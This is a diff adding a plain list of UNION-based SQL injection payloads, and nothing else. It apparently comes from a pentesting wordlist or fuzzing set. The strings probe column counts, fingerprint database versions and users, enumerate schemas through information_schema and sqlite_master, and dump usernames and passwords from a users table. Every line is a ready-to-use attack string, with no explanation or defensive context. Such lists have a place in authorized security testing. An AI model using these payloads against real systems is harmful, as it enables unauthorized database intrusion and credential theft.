@@ -1,0 +1,39 @@
+# SQL Injection - UNION-based
+# Payloads to extract data via UNION SELECT
+# Column enumeration and data exfiltration
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT @@version,NULL--
+' UNION SELECT version(),NULL--
+' UNION SELECT user(),NULL--
+' UNION SELECT database(),NULL--
+' UNION SELECT current_user(),NULL--
+' UNION SELECT schema_name,NULL FROM information_schema.schemata--
+' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT group_concat(username,0x3a,password),NULL FROM users--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+') UNION SELECT NULL--
+') UNION SELECT NULL,NULL--
+') UNION SELECT NULL,NULL,NULL--
+' UNION SELECT sql,NULL FROM sqlite_master--
+' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
+' UNION SELECT NULL,NULL,NULL,NULL FROM dual--
+0 UNION SELECT NULL,NULL--
+0 UNION SELECT NULL,NULL,NULL--
